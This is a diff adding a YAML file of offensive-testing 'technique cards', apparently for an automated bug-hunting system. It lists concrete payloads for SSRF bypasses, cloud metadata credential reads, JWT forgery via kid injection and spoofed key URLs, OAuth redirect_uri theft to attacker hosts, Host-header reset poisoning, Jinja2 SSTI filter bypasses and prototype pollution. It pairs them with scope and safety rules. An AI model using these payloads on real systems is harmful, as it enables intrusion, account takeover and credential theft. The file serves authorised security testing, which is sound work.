@@ -1,0 +1,1409 @@
+# DEEPHUNT technique cards — books/corpora bypass primitives (Wave 1 ingestion, 2026-09-27)
+# Source: hunt_waves/wave1/cards_corpora. Normalized to schema v2 top-level list.
+# All wording original; facts attributed inline in evidence entries.
+
+- id: C1-001
+  name: SSRF filter bypass via IP-format polymorphism
+  klass: ssrf
+  requires:
+  - url_input_parameter
+  signals:
+  - fetch_parameter_accepts_arbitrary_host
+  - filter_blocks_dotted_decimal_private_ips
+  questions:
+  - Does the filter validate the literal string instead of the resolved address?
+  - Does the URL parser normalize alternate IP notations before the allowlist check?
+  evidence:
+    positive:
+    - Collaborator/OOB nonce returned for the encoded URL, or internal-content marker (e.g., metadata-shaped JSON, service
+      banner) in the response.
+    - Fetch of an alternate-encoding internal address returns internal content or distinct timing
+    - OOB callback received at collaborator for the polymorphic URL
+    negative:
+    - All encodings rejected with the same filter error as the literal IP
+    - No OOB callback and response identical to a public-control URL
+  followups:
+  - C1-002
+  - C1-003
+  - C1-004
+  test: 'Replace a blocked 127.0.0.1 / 169.254.169.254 with equivalent encodings: decimal (http://2130706433/), octal (http://0177.0.0.1/),
+    hex (http://0x7f.0.0.1/ or mixed 0x7f.0.0.1), IPv6 loopback (http://[::1]/), IPv4-mapped IPv6 (http://[::ffff:127.0.0.1]/),
+    and shortened forms (http://127.1/, http://0x7f.1/). Submit each as the fetch parameter value.'
+  impact_hint: SSRF to loopback/internal services; escalation path to cloud metadata or internal admin APIs.
+  preconditions:
+  - A server-side fetch of a user-controlled URL exists
+  - A naive filter blocks dotted-decimal private ranges or the literal 127.0.0.1
+  required_state: unauthenticated
+  hypothesis_generator: If the filter matches the URL string rather than the socket address, alternate numeric encodings of
+    the same IP will pass the filter and still resolve to the internal host.
+  request_strategy: Single GET/POST per encoding, low rate; keep total probes small and sequential.
+  mutation_strategy: Permute IP encodings one axis at a time (decimal, octal, hex, IPv6, shortened) against the same endpoint.
+  expected_signal: Response body/timing for the encoded URL differs from the blocked baseline (blocked = error/reject page),
+    matching an internal fetch signature.
+  positive_oracle: Collaborator/OOB nonce returned for the encoded URL, or internal-content marker (e.g., metadata-shaped
+    JSON, service banner) in the response.
+  negative_evidence:
+  - All encodings rejected with the same filter error as the literal IP
+  - No OOB callback and response identical to a public-control URL
+  false_positive_rules:
+  - Never claim on a reflected echo of the URL — require a response-shaped token the target alone could produce
+  - Timeout alone is not confirmation; closed ports answer fast, filtered hosts hang — compare against a known-closed-port
+    baseline
+  followup_experiment: Once an encoding passes, escalate to metadata endpoints (C1-003) and redirect chains (C1-004) using
+    the passing encoding.
+  regression_test: Re-run the literal blocked IP and one passing encoding; blocked must stay blocked, passing must stay passing.
+  difficulty_estimate: 2
+- id: C1-002
+  name: SSRF allowlist bypass via DNS rebinding TOCTOU
+  klass: ssrf
+  requires:
+  - url_input_parameter
+  - owned_dns_record
+  signals:
+  - filter_validates_hostname_at_request_time
+  - dns_lookup_happens_at_connect_time
+  questions:
+  - Is the allowlist applied to the DNS name rather than the resolved IP?
+  - Is there a window between the check and the connection where DNS can change?
+  evidence:
+    positive:
+    - Collaborator log shows a hit with the flipped nonce, or internal-content marker in the response.
+    - OOB hit from an internal source IP shortly after the DNS record flips to internal
+    - Internal content returned when the resolver was just flipped
+    negative:
+    - No OOB hit across multiple flip timings
+    - Server appears to resolve once and cache (second request reuses first resolution)
+  followups:
+  - C1-003
+  test: Point the fetch parameter at a domain you control with a very low TTL. Serve the public IP first (passes the allowlist),
+    then flip the record to 127.0.0.1 or 169.254.169.254 and re-send the request quickly. Use distinct OOB nonces per attempt
+    so a hit proves the flipped resolution was used.
+  impact_hint: Full SSRF despite a correct-looking hostname allowlist; same escalation as classic SSRF.
+  preconditions:
+  - The server resolves the hostname itself at connect time
+  - You control an authoritative DNS name with low TTL, or a rebinding service
+  required_state: unauthenticated
+  hypothesis_generator: If validation happens on the hostname string at request time but resolution happens later at connect
+    time, a DNS flip between the two defeats the allowlist.
+  request_strategy: 'Two-phase: warm the allowlist with the benign resolution, then flip and fire; a handful of attempts,
+    watch collaborator.'
+  mutation_strategy: Vary TTL and flip timing; try flipping to loopback first, then to metadata IP.
+  expected_signal: OOB callback keyed to a nonce sent only in the flipped-resolution request.
+  positive_oracle: Collaborator log shows a hit with the flipped nonce, or internal-content marker in the response.
+  negative_evidence:
+  - No OOB hit across multiple flip timings
+  - Server appears to resolve once and cache (second request reuses first resolution)
+  false_positive_rules:
+  - A hit before the flip only proves benign resolution — the nonce must be unique to the flipped attempt
+  - Do not hammer; repeated flips against a shared resolver can look like abuse
+  followup_experiment: If rebinding works, chain to metadata credential theft (C1-003) with the flipped record pointing at
+    169.254.169.254.
+  regression_test: Reset DNS to benign, confirm the request is allowed again and no internal hit occurs.
+  difficulty_estimate: 4
+- id: C1-003
+  name: Cloud metadata SSRF via header-requirement primitives
+  klass: cloud
+  requires:
+  - ssrf_primitive_confirmed
+  signals:
+  - fetch_of_metadata_ip_returns_403_or_empty
+  - target_runs_on_aws_gcp_or_azure
+  questions:
+  - Does the metadata endpoint require a special header the SSRF primitive can inject?
+  - Is IMDSv2 in force (needs a PUT token hop) or is IMDSv1 reachable?
+  evidence:
+    positive:
+    - Parseable credentials JSON embedded in the response (extract and HTML-unescape before parsing).
+    - Metadata-shaped JSON (instance-id, ami-id, AccessKeyId) in the SSRF response
+    - Task-role credentials JSON from the ECS endpoint 169.254.170.2
+    negative:
+    - 403/401 on all provider endpoints with no metadata-shaped body
+    - No header-injection vector exists to satisfy the required headers
+  followups:
+  - C1-004
+  test: 'After confirming SSRF, try each provider''s required handshake: AWS IMDSv1 GET /latest/meta-data/iam/security-credentials/;
+    if 401, attempt the IMDSv2 two-hop (PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds) only if the primitive
+    allows method/header control. GCP: /computeMetadata/v1/ with Metadata-Flavor: Google. Azure: /metadata/instance?api-version=2021-02-01
+    with Metadata: true. ECS tasks: http://169.254.170.2/v2/credentials/<guid>.'
+  impact_hint: Cloud credential theft; pivot to IAM, storage, queues.
+  preconditions:
+  - SSRF primitive confirmed (any encoding)
+  - Program scope explicitly permits metadata testing; otherwise use an owned collaborator URL
+  required_state: unauthenticated
+  hypothesis_generator: Metadata endpoints reject plain GETs without their required headers; the SSRF primitive only yields
+    credentials if the fetcher can be made to send those headers or reach the headerless variants.
+  request_strategy: Probe each provider endpoint once; stop at the first that returns metadata-shaped data.
+  mutation_strategy: Rotate provider endpoints; if headers cannot be injected, fall back to headerless paths (IMDSv1, ECS
+    task endpoint).
+  expected_signal: JSON containing AccessKeyId / role credentials / instance identity in the SSRF response body.
+  positive_oracle: Parseable credentials JSON embedded in the response (extract and HTML-unescape before parsing).
+  negative_evidence:
+  - 403/401 on all provider endpoints with no metadata-shaped body
+  - No header-injection vector exists to satisfy the required headers
+  false_positive_rules:
+  - A reflected URL string is not metadata — require JSON structure with provider keys
+  - Never exfiltrate or use real cloud credentials; report the read and stop
+  followup_experiment: If IMDSv2 blocks the token hop, look for a second SSRF primitive that allows header/method control.
+  regression_test: Re-request a benign metadata path; confirm the 403/empty baseline is unchanged.
+  difficulty_estimate: 3
+- id: C1-004
+  name: SSRF allowlist bypass via attacker-controlled redirect chain
+  klass: ssrf
+  requires:
+  - url_input_parameter
+  - owned_http_server
+  signals:
+  - allowlist_accepts_attacker_domain
+  - server_follows_redirects_on_fetch
+  questions:
+  - Is the allowlist applied to the initial URL but not to redirect targets?
+  - How many redirect hops does the fetcher follow?
+  evidence:
+    positive:
+    - Collaborator hit from the redirect chain, or metadata-shaped content in the final response.
+    - OOB hit on the internal target after the redirect, or internal content in the final response
+    negative:
+    - Fetcher returns the 302 body instead of following it
+    - Fetcher re-validates the redirect target against the allowlist
+  followups:
+  - C1-003
+  test: Host a URL on your domain that returns HTTP 302 to the internal target (e.g., http://169.254.169.254/latest/meta-data/).
+    Submit your URL as the fetch parameter. The allowlist sees only your domain; the fetcher follows the redirect to the internal
+    address. Use a unique nonce path per attempt.
+  impact_hint: Defeats domain allowlists entirely; same escalation as direct SSRF.
+  preconditions:
+  - The fetcher follows HTTP redirects
+  - Your domain passes the allowlist
+  required_state: unauthenticated
+  hypothesis_generator: If validation runs once on the submitted URL and redirects are followed without re-validation, an
+    attacker 302 converts an allowed URL into an internal fetch.
+  request_strategy: One redirect URL per internal target; low volume.
+  mutation_strategy: Try 301/302/307/308 and meta-refresh; try redirecting to a second attacker URL that then redirects internal
+    (multi-hop).
+  expected_signal: Internal content or OOB hit keyed to the redirect nonce.
+  positive_oracle: Collaborator hit from the redirect chain, or metadata-shaped content in the final response.
+  negative_evidence:
+  - Fetcher returns the 302 body instead of following it
+  - Fetcher re-validates the redirect target against the allowlist
+  false_positive_rules:
+  - Confirm the hop actually happened — a 302 echo in the response is not a followed redirect
+  - Nonce must be unique per attempt
+  followup_experiment: Chain the passing redirect into metadata endpoints (C1-003).
+  regression_test: Point the redirect back to a benign page; confirm normal fetch behavior.
+  difficulty_estimate: 2
+- id: C1-005
+  name: JWT kid SQL injection for key confusion
+  klass: auth
+  requires:
+  - jwt_with_kid_header
+  signals:
+  - kid_header_present_in_token
+  - distinct_error_or_timing_on_kid_mutation
+  questions:
+  - Is the kid value interpolated into a key-lookup SQL query?
+  - Can a UNION SELECT return an attacker-chosen string as the HMAC key?
+  evidence:
+    positive:
+    - Authenticated response reflects the forged identity (e.g., admin panel reachable, user id changed).
+    - Token signed with the injected key value is accepted for an escalated claim set
+    negative:
+    - Token rejected regardless of kid content
+    - kid appears to select from a fixed key set (only known kids accepted)
+  followups:
+  - C1-006
+  - C1-007
+  test: 'Take a captured JWT, set the kid header to a SQL injection that returns a known string as the key (e.g., kid: nonexistent''
+    UNION SELECT ''attackerkey'' -- ), re-sign the payload with HS256 using ''attackerkey'' as the secret, and submit. If
+    accepted with modified claims, the kid feeds a SQL query.'
+  impact_hint: Full JWT forgery; impersonate any user, escalate to admin.
+  preconditions:
+  - Token carries a kid header claim
+  - Backend looks up the verification key by kid
+  required_state: authenticated_low_privilege
+  hypothesis_generator: If kid is concatenated into a SQL key lookup, injecting a UNION that returns a known constant makes
+    that constant the HMAC secret, letting us mint arbitrary tokens.
+  request_strategy: Single crafted token per attempt; try a few UNION shapes before concluding.
+  mutation_strategy: Vary the UNION payload (comment styles, quote balance) to fit the backend's query shape.
+  expected_signal: Server accepts the re-signed token with attacker-modified claims (role/admin/sub changed).
+  positive_oracle: Authenticated response reflects the forged identity (e.g., admin panel reachable, user id changed).
+  negative_evidence:
+  - Token rejected regardless of kid content
+  - kid appears to select from a fixed key set (only known kids accepted)
+  false_positive_rules:
+  - Acceptance must be tied to the forged claims, not a generic 200 on a public endpoint
+  - Do not mistake signature-not-verified bugs for kid SQLi — first confirm tampered payload without valid signature is rejected
+  followup_experiment: If SQLi fails, try kid path traversal (C1-006) and jku/x5u spoofing (C1-007).
+  regression_test: Submit the original unmodified token; it must still validate.
+  difficulty_estimate: 4
+- id: C1-006
+  name: JWT kid path traversal to attacker-known key material
+  klass: auth
+  requires:
+  - jwt_with_kid_header
+  signals:
+  - kid_header_present_in_token
+  - kid_looks_like_filename_or_path
+  questions:
+  - Is the kid treated as a file path to the verification key?
+  - Which files with known content are readable by the process?
+  evidence:
+    positive:
+    - Server-side identity reflects the forged claims.
+    - Token signed with the known file content (e.g., empty string, '2') is accepted
+    negative:
+    - All kid values rejected or ignored
+    - kid maps to a fixed allowlist of key names
+  followups:
+  - C1-005
+  - C1-007
+  test: Set kid to a traversal reaching a file with known content — ../../../../dev/null (empty key, sign with empty secret)
+    or ../../proc/sys/kernel/randomize_va_space (content '2', sign with '2'). Re-sign the JWT with HS256 using that content
+    as the secret and submit with escalated claims.
+  impact_hint: Full JWT forgery without any key discovery.
+  preconditions:
+  - kid is used as a filesystem path for key loading
+  - At least one readable file with predictable content exists
+  required_state: authenticated_low_privilege
+  hypothesis_generator: If kid becomes a file path, pointing it at a file whose content we know turns that content into the
+    HMAC secret we sign with.
+  request_strategy: Try /dev/null first, then known-content proc files, then /etc/hostname.
+  mutation_strategy: Vary traversal depth and encoding; try absolute paths if relative fails.
+  expected_signal: Forged token with modified claims accepted.
+  positive_oracle: Server-side identity reflects the forged claims.
+  negative_evidence:
+  - All kid values rejected or ignored
+  - kid maps to a fixed allowlist of key names
+  false_positive_rules:
+  - Distinguish from alg=none and signature-not-verified bugs — tampered unsigned token must be rejected first
+  - Do not read sensitive files; use only known-content, non-sensitive paths
+  followup_experiment: If traversal fails, test jku/x5u key-URL spoofing (C1-007).
+  regression_test: Original token with original kid still validates.
+  difficulty_estimate: 3
+- id: C1-007
+  name: JWT jku/x5u spoofed key URL with collaborator oracle
+  klass: auth
+  requires:
+  - jwt_observed
+  - owned_https_server
+  signals:
+  - server_fetches_remote_resources
+  - jku_or_x5u_header_accepted
+  questions:
+  - Does the verifier fetch the key set from the jku/x5u URL without an allowlist?
+  - Does the fetch itself (SSRF-style) happen before signature validation?
+  evidence:
+    positive:
+    - Collaborator log entry for the unique URL, then forged identity reflected server-side.
+    - Collaborator receives a key-fetch callback when jku/x5u points at it
+    - Token signed with attacker key accepted after hosting a JWKS
+    negative:
+    - No callback — jku/x5u ignored or allowlisted
+    - Callback occurs but forged token still rejected (e.g., kid must match)
+  followups:
+  - C1-005
+  test: 'Two-stage: (1) set jku (or x5u) to a unique collaborator URL and submit the token unsigned/unchanged; a callback
+    proves the server fetches key material from attacker URLs (SSRF-shaped finding on its own). (2) Generate your own RSA
+    keypair, host a JWKS containing your public key at that URL, sign a forged token with your private key, and submit.'
+  impact_hint: JWT forgery plus an SSRF primitive via the key-fetch channel.
+  preconditions:
+  - Verifier honors jku/x5u remote key URLs
+  - You can host HTTPS content at a public URL
+  required_state: authenticated_low_privilege
+  hypothesis_generator: If the key URL is not allowlisted, the verifier will fetch attacker-hosted keys, letting us mint tokens
+    it trusts.
+  request_strategy: Stage 1 is a single callback check; stage 2 only if stage 1 fires.
+  mutation_strategy: Try jku first, then x5u; vary between http/https.
+  expected_signal: 'Stage 1: collaborator hit. Stage 2: forged-claims token accepted.'
+  positive_oracle: Collaborator log entry for the unique URL, then forged identity reflected server-side.
+  negative_evidence:
+  - No callback — jku/x5u ignored or allowlisted
+  - Callback occurs but forged token still rejected (e.g., kid must match)
+  false_positive_rules:
+  - The callback alone is the SSRF finding; forgery requires the stage-2 acceptance
+  - Use unique URLs per attempt to avoid cross-talk
+  followup_experiment: If fetch happens but forgery fails, inspect what the server expects at the URL (try hosting the original
+    JWKS with your key added).
+  regression_test: Token with the original jku still validates.
+  difficulty_estimate: 4
+- id: C1-008
+  name: OAuth redirect_uri bypass to authorization-code theft
+  klass: auth
+  requires:
+  - oauth_authorization_endpoint
+  signals:
+  - redirect_uri_parameter_present
+  - weak_validation_error_messages
+  questions:
+  - Does redirect_uri validation compare strings instead of origins?
+  - Can an open-redirect gadget or parser quirk smuggle an attacker host past the check?
+  evidence:
+    positive:
+    - Exchanging the stolen code yields tokens for the victim test account.
+    - Authorization server issues a code to the attacker-controlled redirect_uri
+    negative:
+    - All mutations rejected with invalid redirect_uri
+    - Exact-match validation against a registered list
+  followups:
+  - C1-028
+  - C1-029
+  test: 'From the legitimate authorization URL, mutate redirect_uri through the bypass ladder: subdomain (attacker.target.com),
+    path traversal (target.com/../attacker), userinfo (target.com@attacker.com), backslash normalization (https:/\/attacker.com),
+    query smuggling (attacker.com?target.com), and fragment tricks. For each, check whether the server redirects with a code
+    to the attacker host. Only complete the flow against test accounts you own.'
+  impact_hint: Account takeover via stolen authorization code; token theft if implicit flow.
+  preconditions:
+  - An OAuth/OIDC authorization endpoint with a redirect_uri parameter
+  - A test victim account you control for the final exchange
+  required_state: authenticated_as_test_victim
+  hypothesis_generator: If redirect_uri is validated by substring or naive parsing, a crafted URI passes the check while the
+    browser delivers the code to the attacker.
+  request_strategy: One mutation per request; stop at the first that yields a code to the attacker host.
+  mutation_strategy: Walk the ladder in order of subtlety; encode/decode variants last.
+  expected_signal: 302 to the attacker-controlled URI carrying code=.
+  positive_oracle: Exchanging the stolen code yields tokens for the victim test account.
+  negative_evidence:
+  - All mutations rejected with invalid redirect_uri
+  - Exact-match validation against a registered list
+  false_positive_rules:
+  - A redirect to the attacker host without a code is just an open redirect, not code theft
+  - Never use a real victim; test accounts only
+  followup_experiment: If redirect_uri is strict, test for open-redirect gadgets elsewhere on the domain that can bounce the
+    code (C1-028).
+  regression_test: The legitimate registered redirect_uri still completes the flow.
+  difficulty_estimate: 4
+- id: C1-009
+  name: Host-header injection into absolute password-reset links
+  klass: auth
+  requires:
+  - password_reset_feature
+  signals:
+  - reset_email_contains_absolute_url
+  - application_behind_reverse_proxy
+  questions:
+  - Is the reset link built from the Host header rather than a configured base URL?
+  - Do X-Forwarded-Host or similar headers override Host?
+  evidence:
+    positive:
+    - The emailed URL's host is exactly the attacker domain you injected.
+    - Reset email (to an address you control) contains the injected host in the link
+    negative:
+    - All emails carry the canonical domain regardless of headers
+    - Request rejected when Host mismatches
+  followups:
+  - C1-008
+  test: 'Request a password reset for an address you own, overriding the Host header (and separately X-Forwarded-Host, X-Host,
+    Forwarded) with an attacker domain. Inspect the received email: if the reset link points at your domain, the header is
+    trusted for link generation — the primitive for reset-token theft against real users.'
+  impact_hint: Account takeover at scale if chained with a victim clicking the poisoned link.
+  preconditions:
+  - Password-reset flow sends a link by email
+  - You control the receiving mailbox
+  required_state: unauthenticated
+  hypothesis_generator: If link generation trusts the Host header, an attacker-supplied host poisons the reset URL and the
+    token leaks to the attacker domain.
+  request_strategy: One header variant per reset request; a few requests total.
+  mutation_strategy: Rotate Host, X-Forwarded-Host, X-Host, Forwarded, and port-suffixed variants.
+  expected_signal: Email link host equals the injected value.
+  positive_oracle: The emailed URL's host is exactly the attacker domain you injected.
+  negative_evidence:
+  - All emails carry the canonical domain regardless of headers
+  - Request rejected when Host mismatches
+  false_positive_rules:
+  - Only the emailed link counts — a reflected Host in an HTML page is not this finding
+  - Do not trigger resets for addresses you do not own
+  followup_experiment: Check whether the same header trust affects email-change or invite links.
+  regression_test: Normal reset request yields the canonical domain link.
+  difficulty_estimate: 2
+- id: C1-010
+  name: 'SSTI context fingerprinting: plaintext vs code context'
+  klass: injection
+  requires:
+  - user_input_reflected_in_page
+  signals:
+  - reflection_of_special_characters
+  - math_expression_evaluated_in_response
+  questions:
+  - Is the input rendered inside a template expression already (code context) or as plain data (plaintext context)?
+  - 'Which engine syntax evaluates — {{ }}, ${ }, <%= %>, #{ }, *{ }?'
+  evidence:
+    positive:
+    - Arithmetic evaluated server-side (49 in output) — never claim on mere reflection of the payload string.
+    - 7*7 renders as 49 in the response for exactly one engine syntax
+    - In code context, breaking out with }} yields evaluation of the trailing expression
+    negative:
+    - All syntaxes reflected literally with no evaluation and no errors
+    - Input is HTML-encoded before render (XSS-shaped, not SSTI)
+  followups:
+  - C1-011
+  - C1-012
+  test: 'First send the polyglot probe ${{<%[%''"]}}%\ to detect reflection and error behavior. Then send each math probe
+    ({{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, *{7*7}): if one renders 49, that is the engine and you are in plaintext context.
+    If none evaluate but the polyglot caused an error or swallowed output, try code-context breakout: append the engine''s
+    closing delimiter plus an expression (e.g., }} {{7*7}} or }}hello) and watch whether the trailing part evaluates.'
+  impact_hint: Determines exploitability path; SSTI leads to RCE in most engines.
+  preconditions:
+  - User input is reflected or stored-then-rendered server-side
+  required_state: unauthenticated
+  hypothesis_generator: Plaintext context evaluates injected expressions directly; code context requires closing the existing
+    expression first — the response differential reveals which.
+  request_strategy: A handful of probes per parameter; compare against a benign baseline response.
+  mutation_strategy: Cycle engine syntaxes; then try breakout closers for the syntax that errored.
+  expected_signal: 49 rendered, or a template error naming the engine, or swallowed/dropped reflection.
+  positive_oracle: Arithmetic evaluated server-side (49 in output) — never claim on mere reflection of the payload string.
+  negative_evidence:
+  - All syntaxes reflected literally with no evaluation and no errors
+  - Input is HTML-encoded before render (XSS-shaped, not SSTI)
+  false_positive_rules:
+  - Client-side frameworks (Angular/Vue) can evaluate {{ }} in the browser — confirm the 49 came from the server response,
+    not DOM rendering
+  - Error pages must name a template engine; generic 500s are weak signal
+  followup_experiment: With the engine known, run filter-bypass ladders (C1-011) and error-based fingerprinting (C1-012).
+  regression_test: Benign input renders unchanged; no evaluation of plain text.
+  difficulty_estimate: 2
+- id: C1-011
+  name: Jinja2 SSTI filter bypass via attr() and bracket notation
+  klass: injection
+  requires:
+  - jinja_ssti_confirmed
+  signals:
+  - keywords_like_import_os_blocked
+  - underscores_or_dots_filtered
+  questions:
+  - Does the filter block literal substrings (os, import, __) rather than the capability?
+  - Are request.args / request.values reachable to smuggle blocked words via parameters?
+  evidence:
+    positive:
+    - Server-side evaluation of a constructed expression (e.g., config or class introspection output) — not mere reflection.
+    - Attribute access achieved without literal dots/underscores (e.g., request|attr('args'))
+    - Command output or file content returned through the bypass chain
+    negative:
+    - Sandbox blocks attribute access to dunders regardless of spelling
+    - All construction attempts produce the same filter error
+  followups:
+  - C1-012
+  test: 'When literal keywords are blocked, rebuild them: use the attr filter ({{ request|attr(''application'') }}), bracket
+    access with hex escapes ({{ request[''\x5f\x5fclass\x5f\x5f''] }}), and parameter smuggling — pass the blocked word as
+    a query param and reference it ({{ request|attr(request.args.c) }} with ?c=__class__), or assemble it with format ({{
+    request|attr(request.args.f|format(...)) }}). Climb from attribute access to __globals__ to os.popen only in a lab/authorized
+    scope.'
+  impact_hint: SSTI filter bypass to RCE.
+  preconditions:
+  - Jinja2 (or Twig-like) SSTI confirmed with a keyword/character filter in front
+  required_state: authenticated_if_required_by_feature
+  hypothesis_generator: Substring filters can be defeated by constructing the blocked tokens at render time through filters,
+    bracket access, and request-supplied parameters.
+  request_strategy: 'Escalate gradually: attribute access, then dunder access, then globals — stop at proof of capability.'
+  mutation_strategy: Rotate construction tricks (attr, brackets, hex, format, join of getlist args) one at a time.
+  expected_signal: Blocked keywords no longer needed literally; previously rejected expressions now evaluate.
+  positive_oracle: Server-side evaluation of a constructed expression (e.g., config or class introspection output) — not mere
+    reflection.
+  negative_evidence:
+  - Sandbox blocks attribute access to dunders regardless of spelling
+  - All construction attempts produce the same filter error
+  false_positive_rules:
+  - Do not execute OS commands against a live target — introspection output is sufficient proof
+  - A sandbox escape claim needs the actual capability demonstrated, not just filter evasion on harmless attributes
+  followup_experiment: Map which objects are reachable (self, cycler, joiner, namespace, request) to pick the shortest RCE
+    path in an authorized lab.
+  regression_test: Direct blocked keyword still blocked; bypass spelling evaluated.
+  difficulty_estimate: 4
+- id: C1-012
+  name: SSTI engine fingerprinting from error-message differentials
+  klass: injection
+  requires:
+  - user_input_reflected_in_page
+  signals:
+  - template_error_on_polyglot_probe
+  - error_names_engine_or_syntax
+  questions:
+  - Does invalid template syntax produce an engine-identifying error?
+  - Does the error leak template paths or context variables?
+  evidence:
+    positive:
+    - Engine name or template source visible in the error response.
+    - Error message naming the engine (Jinja2, Twig, Freemarker, Velocity, Smarty) or showing template source lines
+    negative:
+    - Generic 500 with no detail on all malformed input
+    - Errors identical for template and non-template malformed input
+  followups:
+  - C1-010
+  - C1-011
+  test: Send the polyglot ${{<%[%'"]}}%\ and a few malformed per-engine probes; capture full error responses. An engine-identifying
+    message (or a debug page with template source) both confirms SSTI and names the exact exploitation playbook. Also try
+    documentation-object probes ({{config}}, {{settings.SECRET_KEY}}) which leak context without needing RCE.
+  impact_hint: Turns a blind reflection into a targeted engine-specific exploit.
+  preconditions:
+  - Errors are returned to the client (non-production error handling)
+  required_state: unauthenticated
+  hypothesis_generator: Verbose template errors disclose the engine and sometimes the template source, removing the guesswork
+    from SSTI exploitation.
+  request_strategy: A few malformed probes; collect and compare error bodies.
+  mutation_strategy: Vary which delimiter is malformed to trigger different parser errors.
+  expected_signal: Error text naming an engine, showing template code, or dumping context variables.
+  positive_oracle: Engine name or template source visible in the error response.
+  negative_evidence:
+  - Generic 500 with no detail on all malformed input
+  - Errors identical for template and non-template malformed input
+  false_positive_rules:
+  - Do not confuse client-side framework errors with server template errors
+  - Error disclosure alone is information leakage; SSTI still needs the evaluation proof (C1-010)
+  followup_experiment: Feed the identified engine into the targeted bypass ladder (C1-011).
+  regression_test: Benign input produces no error; malformed input error is stable.
+  difficulty_estimate: 2
+- id: C1-013
+  name: Deserialization format fingerprinting from magic bytes and markers
+  klass: deserialization
+  requires:
+  - opaque_blob_parameter
+  signals:
+  - base64_blob_in_cookie_or_param
+  - viewstate_or_faces_endpoints
+  questions:
+  - Is the blob a known serialized format (Java, PHP, Python pickle, Ruby, .NET)?
+  - Does the app deserialize it server-side with a gadget-capable library?
+  evidence:
+    positive:
+    - Server demonstrably parses the blob (error/behavior delta on mutation).
+    - Decoded blob starts with a format magic (rO0AB, O:, \x80\x04, !!python/)
+    - Altering the blob changes server behavior or errors
+    negative:
+    - Blob is opaque/encrypted with no parse errors on mutation
+    - Blob is only integrity-checked client-side
+  followups:
+  - C1-014
+  test: 'Base64-decode the blob and inspect the first bytes: rO0AB... = Java serialization, O:... = PHP serialize, \x80\x04
+    or cPickle opcodes = Python pickle, !!python/ = YAML, BinaryFormatter patterns = .NET, Marshal = Ruby. Confirm server-side
+    processing by flipping a non-structural byte and observing an error/behavior change versus the valid baseline. Gadget
+    exploitation only in authorized lab scope.'
+  impact_hint: Unsafe deserialization leads to RCE via gadget chains per language.
+  preconditions:
+  - An opaque blob the server parses (cookie, hidden field, API body)
+  required_state: authenticated_if_required_by_feature
+  hypothesis_generator: Magic bytes identify the serializer; each language has known gadget chains, so format identification
+    selects the exploitation playbook.
+  request_strategy: Decode offline; send at most a couple of mutated blobs to confirm server-side parsing.
+  mutation_strategy: Flip one byte at a time in non-structural regions; try truncation.
+  expected_signal: Distinct error or behavior change on mutation, versus acceptance of the pristine blob.
+  positive_oracle: Server demonstrably parses the blob (error/behavior delta on mutation).
+  negative_evidence:
+  - Blob is opaque/encrypted with no parse errors on mutation
+  - Blob is only integrity-checked client-side
+  false_positive_rules:
+  - Format identification is not a vulnerability — the finding requires proof of unsafe server-side deserialization
+  - Never fire real gadget chains at a live target; confirm parsing only
+  followup_experiment: If parsing is confirmed, check for HMAC/signature on the blob (missing signature = tampering primitive).
+  regression_test: Pristine blob accepted; mutated blob rejected or errored, consistently.
+  difficulty_estimate: 3
+- id: C1-014
+  name: Server-side prototype pollution via JSON merge endpoints
+  klass: deserialization
+  requires:
+  - json_merge_or_clone_endpoint
+  signals:
+  - node_js_backend
+  - deep_merge_of_request_body
+  questions:
+  - Does the server deep-merge attacker JSON into a shared object?
+  - Is there an externally visible gadget that reads a polluted property?
+  evidence:
+    positive:
+    - Pretty-printed JSON responses (or marker property) appearing where the baseline had none.
+    - Polluting 'json spaces' changes response formatting app-wide
+    - A unique polluted property appears in later responses
+    negative:
+    - No behavior change across several endpoints
+    - Merge is shallow (Object.assign) or uses null-prototype objects
+  followups:
+  - C1-015
+  test: 'POST {"__proto__": {"json spaces": 10}} (or a unique marker property) to an endpoint that merges/clones request JSON.
+    Then GET any JSON endpoint: if responses come back pretty-printed when they previously were not, the server read the indentation
+    setting from the polluted prototype — non-destructive proof. Confirm it fades after restart or is scoped to your test.'
+  impact_hint: Pollution alone is low; chained to a gadget (template, child_process, config flags) it becomes RCE or authz
+    bypass.
+  preconditions:
+  - Node.js backend that merges request objects recursively
+  required_state: authenticated_if_required_by_feature
+  hypothesis_generator: A recursive merge that does not guard __proto__ writes attacker properties onto Object.prototype,
+    observably changing framework behavior.
+  request_strategy: One pollution request, then observe; use unique marker names.
+  mutation_strategy: Try __proto__ first, then constructor/prototype path (C1-015) if filtered.
+  expected_signal: Global behavior change (formatting, status, headers) after the pollution request.
+  positive_oracle: Pretty-printed JSON responses (or marker property) appearing where the baseline had none.
+  negative_evidence:
+  - No behavior change across several endpoints
+  - Merge is shallow (Object.assign) or uses null-prototype objects
+  false_positive_rules:
+  - Pollution without a gadget is a hardening finding, not RCE — say so plainly
+  - 'Rule out caching: verify the change is caused by your request, not a deploy'
+  followup_experiment: 'Hunt for gadgets: properties the app reads without own-property guards (template options, shell/env,
+    config flags).'
+  regression_test: Fresh session shows unpolluted baseline behavior.
+  difficulty_estimate: 3
+- id: C1-015
+  name: Prototype pollution filter bypass via alternate key paths
+  klass: deserialization
+  requires:
+  - json_merge_or_clone_endpoint
+  - proto_key_filtered
+  signals:
+  - __proto___key_stripped_or_rejected
+  - merge_still_occurs
+  questions:
+  - Does the filter only strip the literal __proto__ string?
+  - Does constructor/prototype reach the same object through the merge?
+  evidence:
+    positive:
+    - Same positive oracle as C1-014, triggered through the bypass path.
+    - Pollution succeeds via constructor.prototype when __proto__ is blocked
+    negative:
+    - All alternate paths blocked or inert
+    - Parser rejects nested constructor keys entirely
+  followups:
+  - C1-014
+  test: 'If {"__proto__": ...} is stripped or rejected, retry with {"constructor": {"prototype": {"<marker>": "<value>"}}},
+    bracket-notation query variants (?constructor[prototype][marker]=v), and single-strip evasions (?__pro__proto__to__[marker]=v
+    if the filter removes __proto__ once). Confirm with the same json-spaces or unique-marker oracle as C1-014.'
+  impact_hint: Same as C1-014; bypasses naive key blocklists.
+  preconditions:
+  - A merge sink exists (C1-014 baseline attempted)
+  - __proto__ literal is filtered but merging continues
+  required_state: authenticated_if_required_by_feature
+  hypothesis_generator: Filters that match the literal __proto__ string miss the equivalent constructor.prototype path to
+    Object.prototype.
+  request_strategy: One alternate path per attempt; confirm via the C1-014 oracle.
+  mutation_strategy: Cycle alternate paths and encodings (unicode escapes, null bytes) one axis at a time.
+  expected_signal: Oracle fires for an alternate path while __proto__ stays blocked.
+  positive_oracle: Same positive oracle as C1-014, triggered through the bypass path.
+  negative_evidence:
